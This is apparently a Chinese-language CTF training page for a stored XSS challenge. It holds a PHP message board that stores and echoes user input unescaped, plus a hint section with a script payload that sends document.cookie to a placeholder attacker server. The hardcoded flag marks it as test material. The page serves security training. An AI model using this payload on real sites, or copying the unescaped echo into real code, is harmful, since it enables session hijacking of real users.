<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>CTFShow - 存储型XSS</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            padding: 20px;
            color: #fff;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        .header h1 {
            font-size: 28px;
            color: #00ff88;
            text-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
            margin-bottom: 10px;
        }
        .card {
            background: rgba(22, 33, 62, 0.9);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid rgba(0, 255, 136, 0.2);
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        }
        .card-title {
            color: #00ff88;
            font-size: 16px;
            font-weight: bold;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid rgba(0, 255, 136, 0.2);
        }
        .card-body {
            color: #ccc;
            line-height: 1.6;
        }
        .input-group {
            margin-top: 15px;
        }
        textarea {
            width: 100%;
            height: 100px;
            padding: 12px;
            background: #0d1117;
            border: 2px solid #0f3460;
            border-radius: 8px;
            color: #fff;
            font-size: 14px;
            font-family: 'Courier New', monospace;
            resize: vertical;
            box-sizing: border-box;
        }
        textarea:focus {
            outline: none;
            border-color: #00ff88;
        }
        .btn {
            padding: 12px 25px;
            background: linear-gradient(135deg, #00ff88, #00cc6a);
            border: none;
            border-radius: 8px;
            color: #1a1a2e;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s;
            font-size: 14px;
            margin-top: 10px;
        }
        .btn:hover {
            transform: translateY(-2px);
        }
        .messages {
            background: rgba(0, 255, 136, 0.1);
            border-radius: 8px;
            padding: 15px;
            margin-top: 15px;
            min-height: 100px;
        }
        .message-item {
            padding: 10px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        .message-item:last-child {
            border-bottom: none;
        }
        .message-time {
            font-size: 12px;
            color: #666;
            margin-bottom: 5px;
        }
        .hint {
            background: rgba(255, 193, 7, 0.1);
            border-left: 4px solid #ffc107;
            padding: 12px;
            border-radius: 0 8px 8px 0;
            margin: 15px 0;
            color: #ffc107;
            font-size: 14px;
        }
        pre {
            background: #0d1117;
            padding: 15px;
            border-radius: 8px;
            overflow-x: auto;
            margin: 10px 0;
            font-size: 14px;
        }
        .admin-notice {
            background: rgba(0, 191, 255, 0.1);
            border: 1px solid rgba(0, 191, 255, 0.3);
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
            color: #00bfff;
            font-size: 14px;
        }
        .footer {
            text-align: center;
            margin-top: 30px;
            color: #666;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>存储型XSS</h1>
            <div class="subtitle">CTFShow Style</div>
        </div>

        <div class="card">
            <div class="card-title">题目描述</div>
            <div class="card-body">
                <p>这是一个留言板系统，尝试注入XSS代码获取管理员的cookie</p>
                <div class="hint">
                    提示：管理员会定期访问留言板，需要窃取管理员的cookie来获取flag
                </div>
                <div class="admin-notice">
                    注意：这是一个模拟环境，管理员（机器人）会每隔30秒访问留言板
                </div>
            </div>
        </div>

        <div class="card">
            <div class="card-title">当前环境</div>
            <div class="card-body">
                <pre>Flag位置: 管理员的cookie中
攻击目标: 窃取管理员的cookie
攻击方式: 在留言板注入XSS payload，管理员访问时执行</pre>
            </div>
        </div>

        <div class="card">
            <div class="card-title">发布留言</div>
            <div class="card-body">
                <form method="POST" class="input-group">
                    <textarea name="message" id="messageInput" placeholder="输入留言内容"></textarea>
                    <button type="submit" class="btn">发布留言</button>
                </form>
            </div>
        </div>

        <div class="card">
            <div class="card-title">留言列表</div>
            <div class="card-body">
                <div class="messages" id="messagesBox">
                    <?php
                    $dataFile = 'data.txt';
                    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['message'])) {
                        $message = $_POST['message'];
                        $time = date('Y-m-d H:i:s');
                        $entry = "<div class='message-item'><div class='message-time'>$time</div><div class='message-content'>$message</div></div>";
                        file_put_contents($dataFile, $entry, FILE_APPEND);
                    }

                    if (file_exists($dataFile)) {
                        echo file_get_contents($dataFile);
                    } else {
                        echo "<div class='message-item'>暂无留言...</div>";
                    }
                    ?>
                </div>
            </div>
        </div>

        <div class="card">
            <div class="card-title">解题思路</div>
            <div class="card-body">
                <pre>1. 使用XSS平台或自己搭建的接收服务器
2. 构造payload: &lt;script&gt;window.location.href='http://你的服务器/?c='+document.cookie&lt;/script&gt;
3. 等待管理员访问留言板
4. 在你的服务器上查看管理员的cookie
5. cookie中包含flag</pre>
            </div>
        </div>

        <div class="footer">
            <p>Mlai Lab - 网络安全培训平台</p>
            <p>环境ID: xss-stored</p>
        </div>
    </div>

    <script>
        window.flag = "Mlai{xss_stored_2026}";
        window.admin_cookie = "flag=" + window.flag;

        setInterval(function() {
            console.log("管理员访问了留言板");
        }, 30000);
    </script>
</body>
</html>